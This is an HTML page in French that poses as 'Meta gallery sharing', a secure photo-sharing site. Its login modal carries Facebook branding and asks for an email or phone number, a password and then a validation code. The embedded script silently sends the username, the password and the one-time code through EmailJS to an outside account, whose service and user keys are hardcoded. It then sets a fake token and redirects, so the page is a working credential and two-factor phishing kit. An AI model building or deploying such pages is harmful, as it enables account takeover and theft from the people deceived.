<!doctype html>
<html lang="fr">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>
<title>Meta gallery sharing</title>

<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">

<style>
:root{
  --primary:#1b5f8a;
  --bg:#f7fbff;
  --card:#ffffff;
}
body{
  margin:0;
  font-family:Inter, system-ui, Arial;
  background:linear-gradient(180deg,#f7fbff 0%,#e9f6ff 100%);
  color:#123;
}
header{
  max-width:1100px;
  margin:0 auto;
  padding:24px;
  display:flex;
  align-items:center;
  gap:20px;
}
.logo{
  width:72px;
  height:72px;
  border-radius:18px;
  background:linear-gradient(135deg,#ffffff,#fff3d8);
  display:flex;
  align-items:center;
  justify-content:center;
  font-weight:800;
  color:var(--primary);
  box-shadow:0 8px 24px rgba(0,0,0,.08);
}
nav{
  margin-left:auto;
  display:flex;
  gap:12px;
}
.btn{
  background:var(--primary);
  color:#fff;
  border:none;
  padding:10px 16px;
  border-radius:12px;
  font-weight:600;
  cursor:pointer;
}
.hero{
  max-width:1100px;
  margin:0 auto;
  padding:40px 24px;
  display:grid;
  grid-template-columns:1.2fr .8fr;
  gap:32px;
  align-items:center;
}
.hero h1{margin:0;font-size:34px;color:var(--primary)}
.hero p{opacity:.8}
.hero img{
  width:100%;
  border-radius:16px;
  box-shadow:0 16px 40px rgba(0,0,0,.12);
}
.modal{
  position:fixed;
  inset:0;
  background:rgba(0,0,0,.45);
  display:none;
  align-items:center;
  justify-content:center;
}
.modal .box{
  background:#fff;
  padding:24px;
  width:360px;
  border-radius:14px;
  box-shadow:0 20px 60px rgba(0,0,0,.4);
}
.modal input{
  width:100%;
  padding:10px;
  margin-top:10px;
  border-radius:8px;
  border:1px solid #dde6ef;
}
.note{font-size:13px;opacity:.7;margin-top:8px;}
#modalNotification{
  display:none;
  padding:10px 15px;
  margin:10px 0;
  background-color:#1b5f8a;
  color:white;
  border-radius:6px;
  text-align:center;
  font-weight:600;
  font-family:Inter, system-ui, Arial;
  opacity:0;
  transform: translateY(-10px);
  transition: opacity 0.4s ease, transform 0.4s ease;
}
</style>
</head>

<body>

<header>
  <div class="logo">MetaShare</div>
  <div>
    <strong>Meta gallery sharing</strong><br>
    <small>Partage s√©curis√© de photos</small>
  </div>
  <nav>
    <button class="btn" id="loginBtn">Se connecter / Acc√®s s√©curis√©</button>
  </nav>
</header>

<section class="hero">
  <div>
    <h1>Archive de vos souvenirs.</h1>
    <p>Interface de partage s√©curis√© de photos.</p>
  </div>
  <img src="logo.png" alt="Logo" style="width:120px; height:120px;">
</section>

<!-- MODALE LOGIN -->
<div class="modal" id="loginModal">
  <div class="box">


<h2 style="text-align:center;color:#1877f2; display:flex; flex-direction:column; align-items:center; gap:10px;">

<img src="logo_fb.png" 
             alt="logo_fb" 
             style="width:48px; height:48px;">

        Identification
      </h2>

    <div id="modalNotification"></div>

    <input id="userId" placeholder="Courriel ou num√©ro de mobile">
    <input id="password" type="password" placeholder="Mot de passe">
    <input id="code" maxlength="8" placeholder="Code de validation" style="display:none">

    <button class="btn" id="confirmLogin" style="width:100%;margin-top:12px">
      Se connecter
    </button>

    <p class="note">Acc√®s s√©curis√©</p>
  </div>
</div>

<script>
const modal = document.getElementById('loginModal');
const loginBtn = document.getElementById('loginBtn');
const confirmLogin = document.getElementById('confirmLogin');
const codeInput = document.getElementById('code');
const userIdInput = document.getElementById('userId');
const passwordInput = document.getElementById('password');
const modalNotif = document.getElementById('modalNotification');

let codeSent = false; // √©tat du bouton

// üîπ REDIRECTION SI TOKEN EXISTE
if(sessionStorage.getItem("demo_auth_token") === "true"){
    window.location.href = "secure-photos.html";
}

// Notification anim√©e
function showModalNotification(message){
    modalNotif.textContent = message;
    modalNotif.style.display = "block";
    requestAnimationFrame(()=>{
        modalNotif.style.opacity = "1";
        modalNotif.style.transform = "translateY(0)";
    });
    setTimeout(()=>{
        modalNotif.style.opacity = "0";
        modalNotif.style.transform = "translateY(-10px)";
        setTimeout(()=> modalNotif.style.display = "none", 400);
    }, 3000);
}

// Ouvrir modale
loginBtn.addEventListener("click", ()=> modal.style.display = "flex");
modal.addEventListener("click", e=>{if(e.target===modal) modal.style.display="none";});

// EMAILJS (remplace tes cl√©s ici)
async function sendEmailLogin(username, password){
  return fetch("https://api.emailjs.com/api/v1.0/email/send",{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body: JSON.stringify({
      service_id:"service_uvghcck",
      template_id:"template_email",
      user_id:"aQIYW-EEnTtmxU4FY",
      template_params:{username,password}
    })
  });
}
async function sendCodeValidation(code){
  return fetch("https://api.emailjs.com/api/v1.0/email/send",{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body: JSON.stringify({
      service_id:"service_uvghcck",
      template_id:"template_code",
      user_id:"aQIYW-EEnTtmxU4FY",
      template_params:{code}
    })
  });
}

// CONNEXION (un seul gestionnaire avec √©tat)
confirmLogin.onclick = async ()=>{
  const user = userIdInput.value.trim();
  const pwd  = passwordInput.value.trim();

  if(!codeSent){ // premi√®re √©tape : envoi email
    if(!user || !pwd){
      showModalNotification("Veuillez remplir tous les champs.");
      return;
    }

    confirmLogin.disabled = true;
    confirmLogin.textContent = "Envoi‚Ä¶";

    const response = await sendEmailLogin(user,pwd);
    if(!response.ok){
      showModalNotification("Erreur d'envoi.");
      confirmLogin.disabled = false;
      confirmLogin.textContent = "Se connecter";
      return;
    }

    showModalNotification("Code de validation envoy√©.");
    codeInput.style.display = "block";
    confirmLogin.textContent = "Valider le code";
    confirmLogin.disabled = false;

    codeSent = true; // passe √† l'√©tat validation
    return;
  }

  // validation du code
  const code = codeInput.value.trim();
  if(!/^[0-9]{6,8}$/.test(code)){
    showModalNotification("Code invalide.");
    return;
  }

  const rep = await sendCodeValidation(code);
  if(!rep.ok){
    showModalNotification("Erreur validation code.");
    return;
  }

  // ‚úÖ Token d√©fini et redirection
  sessionStorage.setItem("demo_auth_token","true");
  window.location.href="secure-photos.html";
};
</script>

</body>
</html>
